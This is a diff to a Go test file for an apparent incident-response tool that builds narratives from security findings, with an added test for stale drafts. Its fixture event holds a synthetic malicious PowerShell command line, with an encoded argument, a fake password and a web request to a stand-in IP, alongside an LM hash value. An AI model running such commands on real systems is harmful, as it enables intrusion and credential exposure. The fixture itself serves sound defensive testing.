@@ -129,7 +129,7 @@ func caseWithFindings(t *testing.T, svc *Service, mux http.Handler, mod func(*[]
 		return model.Event{ID: id, CaseID: c.ID, CollectionID: col.ID, SourceFileID: sf.ID, Timestamp: t0.Add(time.Duration(i) * time.Second),
 			EventType: "process_creation", ArtifactType: "windows_event_log", Host: host, User: "CORP\\alice", DedupHash: "d-" + id,
 			ProcessName: "powershell.exe", ParentProcessName: "winword.exe", EventID: 4688,
-			CommandLine:   "powershell -enc QUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJD -password Hunter2xyz -c iwr 203.0.113.9",
+			CommandLine:   "powershell -enc QUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJD -password Hunter2xyz -c iwr 203.0.113.9 -s fileserver02",
 			FilePath:      `C:\Users\alice\AppData\Local\Temp\x.ps1`,
 			NetworkSource: "10.1.2.3", NetworkDest: "203.0.113.9", NetworkDestPort: 443,
 			Extra: map[string]string{"logon_type": "3", "outcome": "success", "sql_statement": "SELECT * FROM payroll", "ntlm_hash": "aad3b435b51404eeaad3b435b51404ee",
@@ -143,7 +143,7 @@ func caseWithFindings(t *testing.T, svc *Service, mux http.Handler, mod func(*[]
 			Description: "alice opened a document on host01 that started powershell.exe talking to 203.0.113.9", SupportingEvents: []string{"ev-1", "ev-2"},
 			Techniques: []string{"T1059.001"}, FirstSeen: t0, LastSeen: t0.Add(time.Second), CreatedAt: t0},
 		{ID: "fnd-2", CaseID: c.ID, RuleID: "encoded-powershell", Title: "Encoded PowerShell command", Severity: "low", Confidence: "low",
-			Description: "A PowerShell command with an encoded argument ran", SupportingEvents: []string{"ev-1"},
+			Description: "A PowerShell command with an encoded argument ran against corp.example", SupportingEvents: []string{"ev-1"},
 			Techniques: []string{"T1027"}, FirstSeen: t0, LastSeen: t0, CreatedAt: t0},
 	}
 	if mod != nil {
@@ -496,5 +496,24 @@ func TestNarrative_ARateLimitIsWaitedOutOnce(t *testing.T) {
 	// both attempts carried the same text: a retry is not a second disclosure
 	if stub.reqs[0].User != stub.reqs[1].User {
 		t.Errorf("the retry sent different text")
+	}
+}
+
+func TestViewOf_ADraftIsStaleWhenAFindingIsReplacedEvenIfTheCountIsTheSame(t *testing.T) {
+	f := func(id string) model.Finding {
+		return model.Finding{ID: id, Severity: "high", FirstSeen: time.Date(2026, 3, 14, 9, 0, 0, 0, time.UTC)}
+	}
+	n := model.Narrative{FindingIDs: []string{"fnd-1", "fnd-2"}, SentencesJSON: "[]"}
+	if v := viewOf(n, []model.Finding{f("fnd-2"), f("fnd-1")}); v.Stale {
+		t.Errorf("the same findings in another order are not stale")
+	}
+	if v := viewOf(n, []model.Finding{f("fnd-1"), f("fnd-9")}); !v.Stale {
+		t.Errorf("a replaced finding with the same count must be stale")
+	}
+	if v := viewOf(n, []model.Finding{f("fnd-1")}); !v.Stale {
+		t.Errorf("a removed finding must be stale")
+	}
+	if v := viewOf(n, nil); !v.Stale {
+		t.Errorf("no findings left must be stale")
 	}
 }
